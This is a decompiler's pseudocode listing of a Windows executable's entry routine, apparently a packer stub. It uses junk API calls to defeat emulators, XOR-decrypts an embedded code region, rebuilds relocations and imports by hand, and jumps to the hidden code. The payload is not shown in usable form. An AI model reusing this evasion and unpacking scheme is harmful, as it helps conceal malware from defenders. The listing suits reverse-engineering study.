/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void __noreturn start(); // weak

//-------------------------------------------------------------------------
// Data declarations

char byte_4012B0[] = { '”' }; // weak
_UNKNOWN loc_401A80; // weak
int dword_402590[156] =
{
  1510808958,
  -1526867367,
  288096765,
  766319680,
  1827392644,
  741330540,
  841962325,
  -393035590,
  -23247272,
  959400480,
  -922567404,
  -584424884,
  1699978310,
  -1625909864,
  1711934895,
  -931269873,
  2026199842,
  1528859110,
  706682775,
  -303010463,
  75993981,
  424481802,
  -944953176,
  -981768301,
  1485776662,
  -887998073,
  1297343376,
  1193735572,
  -1334692853,
  1858454659,
  -1823288747,
  -1701483952,
  48468053,
  -37394135,
  1441384065,
  -2027063805,
  315053449,
  1612719965,
  -1632051020,
  431098115,
  622924992,
  1697564127,
  633980852,
  995514981,
  -511325757,
  -141668506,
  938558671,
  -953699415,
  -801411929,
  1748865324,
  -1830774778,
  1358758009,
  -10431457,
  1341352981,
  1567723483,
  745675205,
  -342004963,
  861381885,
  782902251,
  -6086829,
  -46440535,
  1623465808,
  -211025409,
  1975442255,
  2116603244,
  -1990587107,
  1470430682,
  -1440486605,
  -1558228178,
  996125183,
  -1004580611,
  1812070240,
  -1092923405,
  684551285,
  1510808958,
  -1526867319,
  602616663,
  525545130,
  1604976547,
  525401403,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
// extern BOOL (__stdcall *AreAnyAccessesGranted)(DWORD GrantedAccess, DWORD DesiredAccess);
// extern BOOL (__stdcall *AddAce)(PACL pAcl, DWORD dwAceRevision, DWORD dwStartingAceIndex, LPVOID pAceList, DWORD nAceListLength);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
char byte_404000[512] =
{
  '\x1F',
  '£',
  '\xFF',
  '©',
  '_',
  ';',
  'ý',
  'P',
  '\x1F',
  'Ä',
  '`',
  '\xFF',
  '\x01',
  'l',
  'ó',
  'O',
  'Û',
  '¾',
  'u',
  'l',
  'Í',
  '(',
  '~',
  '\x1D',
  '\r',
  'Z',
  '‰',
  'Ú',
  'ý',
  '¤',
  'W',
  '3',
  'ë',
  '#',
  'ª',
  '.',
  'S',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak


//----- (00401000) --------------------------------------------------------
void __noreturn start()
{
  _WORD *v0; // ebx
  int v1; // esi
  int v2; // esi
  int v3; // esi
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int v10; // esi
  int v11; // esi
  int v12; // esi
  int v13; // esi
  int v14; // esi
  int v15; // esi
  int v16; // esi
  int v17; // esi
  int v18; // esi
  int v19; // esi
  int v20; // esi
  int v21; // esi
  int v22; // esi
  int v23; // esi
  int v24; // esi
  int v25; // esi
  int v26; // esi
  int v27; // esi
  _WORD *v28; // esi
  unsigned int v29; // ecx
  char *v30; // edi
  int *v31; // edx
  _WORD *v32; // ecx
  unsigned int v33; // esi
  char *v34; // eax
  int v35; // eax
  char *v36; // ebx
  int v37; // edx
  int v38; // ecx
  int v39; // esi
  int v40; // ebp
  int *v41; // ebp
  FARPROC *i; // ebx
  int v43; // eax
  unsigned int v44; // [esp+10h] [ebp-Ch]
  char *v45; // [esp+10h] [ebp-Ch]
  HMODULE hModule; // [esp+14h] [ebp-8h]

  v0 = 0;
  v1 = AddAce(0, 0, 0, 0, 0) + 37;
  v2 = AddAce(0, 0, 0, 0, 0) + v1;
  v3 = AddAce(0, 0, 0, 0, 0) + v2;
  v4 = AddAce(0, 0, 0, 0, 0) + v3;
  v5 = AddAce(0, 0, 0, 0, 0) + v4;
  v6 = AddAce(0, 0, 0, 0, 0) + v5;
  v7 = AddAce(0, 0, 0, 0, 0) + v6;
  v8 = AddAce(0, 0, 0, 0, 0) + v7;
  v9 = AddAce(0, 0, 0, 0, 0) + v8;
  v10 = AddAce(0, 0, 0, 0, 0) + v9;
  v11 = AddAce(0, 0, 0, 0, 0) + v10;
  v12 = AddAce(0, 0, 0, 0, 0) + v11;
  v13 = AddAce(0, 0, 0, 0, 0) + v12;
  v14 = AddAce(0, 0, 0, 0, 0) + v13;
  v15 = AddAce(0, 0, 0, 0, 0) + v14;
  v16 = AddAce(0, 0, 0, 0, 0) + v15;
  v17 = AddAce(0, 0, 0, 0, 0) + v16;
  v18 = AddAce(0, 0, 0, 0, 0) + v17;
  v19 = AddAce(0, 0, 0, 0, 0) + v18;
  v20 = AddAce(0, 0, 0, 0, 0) + v19;
  v21 = AddAce(0, 0, 0, 0, 0) + v20;
  v22 = AddAce(0, 0, 0, 0, 0) + v21;
  v23 = AddAce(0, 0, 0, 0, 0) + v22;
  v24 = AddAce(0, 0, 0, 0, 0) + v23;
  v25 = AddAce(0, 0, 0, 0, 0) + v24;
  v26 = AddAce(0, 0, 0, 0, 0) + v25;
  v27 = AddAce(0, 0, 0, 0, 0) + v26;
  v28 = (_WORD *)(AddAce(0, 0, 0, 0, 0) + v27);
  if ( !AreAnyAccessesGranted(0xFFFFFFFF, 0xFFFFFFFF) )
    v28 -= 17;
  v29 = 0;
  while ( 1 )
  {
    if ( v0 == v28 )
      v0 = 0;
    byte_4012B0[v29++] ^= byte_404000[(_DWORD)v0];
    v0 = (_WORD *)((char *)v0 + 1);
    if ( v29 >= 0x1420 )
    {
      v30 = &byte_4012B0[-640];
      v31 = dword_402590;
      v44 = 0;
      while ( 1 )
      {
        v32 = v31 + 2;
        if ( (unsigned int)(v31[1] - 8) >> 1 )
        {
          v33 = (unsigned int)(v31[1] - 8) >> 1;
          do
          {
            if ( (*v32 & 0xF000) == 12288 )
            {
              v0 = &v32[(_DWORD)v0];
              v34 = &v30[*v31 + (*v32 & 0xFFF)];
              *(_DWORD *)v34 += &byte_4012B0[-268436096];
            }
            ++v32;
            --v33;
          }
          while ( v33 );
        }
        v35 = v31[1];
        v31 = (int *)((char *)v31 + v35);
        v44 += v35;
        if ( v44 >= 0xE4 )
        {
          v36 = &byte_4012B0[2780];
          v45 = &byte_4012B0[2780];
          if ( *(_DWORD *)&byte_4012B0[2796] )
          {
            do
            {
              hModule = LoadLibraryA(&v30[*((_DWORD *)v36 + 3)]);
              CloseHandle((HANDLE)0x62);
              CloseHandle((HANDLE)0x62);
              v39 = v38 + 4 * (_DWORD)CloseHandle;
              if ( hModule )
              {
                v40 = *(_DWORD *)v36;
                if ( !*(_DWORD *)v36 )
                  v40 = *((_DWORD *)v36 + 4);
                v41 = (int *)&v30[v40];
                for ( i = (FARPROC *)&v30[*((_DWORD *)v36 + 4)]; *v41; ++i )
                {
                  v39 = v37 + 2 * v39;
                  v43 = *v41;
                  if ( *v41 >= 0 )
                    *i = GetProcAddress(hModule, &v30[v43 + 2]);
                  else
                    *i = GetProcAddress(hModule, (LPCSTR)(unsigned __int16)v43);
                  ++v41;
                  v30 = &byte_4012B0[-640];
                }
                v36 = v45;
              }
              v36 += 20;
              v45 = v36;
            }
            while ( *((_DWORD *)v36 + 4) );
          }
          ((void (*)(void))loc_401A80)();
          ExitProcess(0);
        }
      }
    }
  }
}
// 4011F5: variable 'v38' is possibly undefined
// 401212: variable 'v37' is possibly undefined
// 401000: using guessed type void __noreturn start();
// 402590: using guessed type int dword_402590[156];

// nfuncs=1 queued=1 decompiled=1 lumina nreq=0 worse=0 better=0
// ALL OK, 1 function(s) have been successfully decompiled
